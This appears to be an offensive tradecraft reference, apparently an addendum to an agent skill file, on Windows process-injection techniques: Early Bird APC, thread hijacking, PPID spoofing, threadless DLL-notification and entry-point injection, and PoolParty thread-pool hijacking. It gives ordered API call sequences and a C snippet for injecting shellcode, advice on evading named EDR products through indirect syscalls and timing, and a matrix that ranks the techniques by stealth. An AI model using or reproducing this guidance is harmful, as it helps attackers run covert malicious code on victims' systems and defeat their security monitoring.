# Process Injection Patterns — Detail

EDR monitors classic `OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread`. Avoid it.

## Early Bird APC Injection

Injects shellcode into a freshly-created suspended process before EDR has loaded its DLL and hooked functions:

1. `CreateProcess(target, CREATE_SUSPENDED | CREATE_NO_WINDOW)` → `pi`
2. `VirtualAllocEx(pi.hProcess, PAGE_READWRITE)` → `remoteBase`
3. `WriteProcessMemory(pi.hProcess, remoteBase, shellcode)`
4. `VirtualProtectEx(pi.hProcess, remoteBase, PAGE_EXECUTE_READ)` — flip R→X only after write
5. `QueueUserAPC(remoteBase, pi.hThread)` — APC fires when thread resumes
6. `ResumeThread(pi.hThread)` — thread enters alertable state at init, fires APC

**Why it works**: EDR DLL not yet injected → hooks not in place when APC runs.

**EDR countermeasures (2025)**: `QueueUserAPC` pointing to non-.text memory flagged; `CREATE_SUSPENDED` + early APC pattern detected. Use indirect syscalls for steps 2-5.

**Variant — Early Cryo Bird**: `NtSetInformationJobObject(JOBOBJECT_FREEZE_INFORMATION)` freezes without `CREATE_SUSPENDED` flag.

## Thread Hijacking

Redirect an existing thread's RIP to shellcode without creating a new thread:

1. `OpenThread(THREAD_ALL_ACCESS, tid)` → `hThread`
2. `SuspendThread(hThread)`
3. `GetThreadContext(hThread, &ctx)` (ctx.ContextFlags = CONTEXT_FULL)
4. Set `ctx.Rip = remoteShellcodeBase`; fix `RCX/RDX/R8/R9` for args if needed
5. `SetThreadContext(hThread, &ctx)`
6. `ResumeThread(hThread)`

**EDR signal**: `SuspendThread` + `SetThreadContext` pair monitored (ETW 2 events). Use `NtGetContextThread`/`NtSetContextThread` via indirect syscall.

**Waiting Thread Hijacking (2025 variant)**: target thread already suspended in `NtDelayExecution`. No `SuspendThread` call, no `THREAD_SUSPEND_RESUME` access needed. Requires polling RIP until inside `NtDelayExecution`.

## PPID Spoofing

Makes child process appear spawned by trusted parent (e.g. `explorer.exe`) to defeat parent-child behavioral rules:

```c
InitializeProcThreadAttributeList(attrs, 1, 0, &size);
UpdateProcThreadAttribute(attrs, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    &hParent, sizeof(HANDLE), NULL, NULL);
STARTUPINFOEX si = { .StartupInfo.cb = sizeof(si), .lpAttributeList = attrs };
CreateProcessW(L"target.exe", ..., &si, &pi);
```

**EDR countermeasure (kernel-side)**: `PsSetCreateProcessNotifyRoutineEx` and Security Event 4688 record the **real** creator PID from `PspInsertProcess`. PEB `InheritedFromUniqueProcessId` is the only field the attribute rewrites. Any EDR ingesting kernel notify or 4688 sees the mismatch. Token impersonation of the spoofed parent **before** `CreateProcess` limits the impact to usermode-only readers.

**Token inheritance**: spoofed parent with SYSTEM token → child inherits it.

**Access required**: open parent handle with `PROCESS_CREATE_PROCESS` access.

## Threadless Injection (DLL Notification / EPI)

Avoids explicit `NtCreateThreadEx`. No thread-create kernel callback fires because the payload runs on an existing thread's stack when a legitimate library-load event happens.

Two variants:

1. **DLL Notification Callback**: register `LdrRegisterDllNotification(reason, callback, ctx, cookie)`. Any future `LoadLibrary*` in the process fires `callback` on the loading thread. Payload lives in `callback`.
2. **Entry-Point Injection (EPI, Kudaes/EPI pattern)**: map payload into a legitimate `SEC_IMAGE` DLL region, rewrite the DLL's `AddressOfEntryPoint`. Next `LdrLoadDll` on that DLL invokes payload as if it were `DllMain`.

**Detection surface**:

- `LdrRegisterDllNotification` is hooked by S1 and Elastic Defend 2025+ — registration itself is a signal (low weight, but present).
- The subsequent `LoadLibrary` needs to be a real, legitimate one; forcing a `LoadLibrary` right after registration is the tell. Wait for organic loads (e.g., app-triggered COM object init).
- EPI's entry-point rewrite modifies the DLL's PE header in-process. Anti-scanning tools (PE-Sieve, Moneta) flag modified `AddressOfEntryPoint` unless the DLL is remapped fresh after the rewrite.

**When to use**: same-process execution when a new thread would trip `PsSetCreateThreadNotifyRoutine`. Also useful in beacon post-exploitation where organic library loads happen frequently (e.g., host apps that plug in components).

**Constraint**: only works in processes that continue to load DLLs. Idle single-DLL processes never trigger the notification.

## PoolParty Variants

Thread-pool timer / wait / IO callbacks provide legitimate call-stack context (ntdll TP worker). Payload is delivered via `TP_TIMER`, `TP_WAIT`, `TP_IO`, `TP_WORK`, `TP_ALPC` object callback pointers into a target process's thread-pool.

**Basic pattern** (cross-process TP hijack, 2023-2024 tradecraft):

1. `OpenProcess(PROCESS_ALL_ACCESS, target)` — subject to `ObRegisterCallbacks` mask reduction.
2. Enumerate target's `TP_POOL` objects via `NtQuerySystemInformation(SystemProcessInformation)` and TP internals.
3. Allocate + write payload into target.
4. `NtSetInformationWorkerFactory` or direct write on `TP_WORK` callback pointer.
5. Trigger via a wait object or timer.

**2025 status**: S1 and Elastic correlate high-frequency TP callback additions with unbacked target RIPs. Effective when TP callback count is low and payload runs from a legitimate module region (module-stomp target). Falls off sharply when payload is in private memory.

**Recommendation**: use PoolParty for one-shot injection into a target that has an active TP; do not use as a beacon-loop primitive.

## Injection Decision Matrix

| Technique | New thread? | Pre-hook window? | EDR signal | Best use |
|-----------|------------|-----------------|-----------|---------|
| Classic CRT | Yes | No | HIGH (hooked) | Avoid |
| Early Bird APC | APC (no new TID) | Yes | MEDIUM | Fresh-process inject |
| Early Cryo Bird | APC via job freeze | Yes (no suspended flag) | LOW-MEDIUM | Stealthier fresh-process |
| Thread hijacking | No | No | MEDIUM (SuspendThread) | Existing process |
| Waiting thread hijack | No | No (but no Suspend needed) | LOW | Existing sleeping thread |
| DLL notification / EPI (threadless) | No | No | LOW-MEDIUM | Same-process; target with organic library loads |
| PoolParty (TP callback hijack) | No | No | MEDIUM | One-shot into target with active TP; not for loops |
| Callback-based (§6b in SKILL.md) | No | No | LOW | Same-process exec |
